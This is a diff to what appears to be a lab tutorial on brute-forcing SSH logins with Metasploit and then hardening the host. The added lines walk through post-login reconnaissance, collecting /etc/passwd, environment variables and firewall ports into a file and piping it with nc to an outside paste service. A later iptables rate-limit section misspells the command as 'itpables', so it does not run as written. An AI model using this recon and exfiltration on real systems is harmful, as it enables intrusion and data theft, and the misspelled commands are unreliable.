@@ -107,7 +107,7 @@ Launch the brute force attack
 
 if Metasploit successfully authenitcates with a usr/pass provided in the lists you'll see a message similar to the following:
 
-`[+] 192.168.0.136:22 - Success: 'docker:password'`
+`[+] 192.168.0.136:22 - Success: 'podman:password'`
 
 
 Not only did metasploit find a combination that successfully authenticates but it also left a session open. List the open sessions
@@ -128,4 +128,47 @@ Now you are connected to a shell on the target. try typing some basic shell comm
 
 connect to the target using the discovered credentials
 
-    ssh graffias.openincite.net -l docker
+    ssh graffias.openincite.net -l podman
+    id
+    sudo -l -U podman
+    
+podman appears to be a non privalaged user. Let's see what we can find out about the system...
+
+    ls -lah $PWD
+    firewall-cmd --list-ports >> $HOSTNAME.txt
+    prinenv >> $HOSTNAME.txt
+    cat /etc/passwd >> $HOSTNAME.txt
+    yum list installed >> $HOSTNAME.txt
+    
+Let's grab a copy of the information we've collected 
+
+    cat $HOSTNAME.txt | nc termbin.com 9999
+    
+# privilage escalation 
+------------
+
+    
+    
+    
+# Protecting a host from bruteforce
+------------
+
+Ensure iptables is installed:
+
+    sudo yum install iptables -y
+
+Add a simple rule to iptables to drop brute force attackes after an excessive amount of attempts
+
+    itpables -P INPUT ACCEPT
+    itpables -P FORWARD ACCEPT
+    itpables -P OUTPUT ACCEPT
+    itpables -N SSHBFATK
+    itpables -A INPUT -p tcp -m tcp --dport 22 -m state --state NEW -m recent --set --name SSH --mask 255.255.255.255 --rsource
+    itpables -A INPUT -p tcp -m tcp --dport 22 -m state --state NEW -m recent --update --seconds 600 --hitcount 50 --name SSH --mask 255.255.255.255 --rsource -j SSHBFATK
+    itpables -A SSHBFATK -m limit --limit 5/min -j LOG --log-prefix "SSH: Detect brute force atk! " --log-level 6
+    itpables -A SSHBFATK -j DROP
+
+Now run the brute force exploit again and observe the behavior
+
+    exploit
+
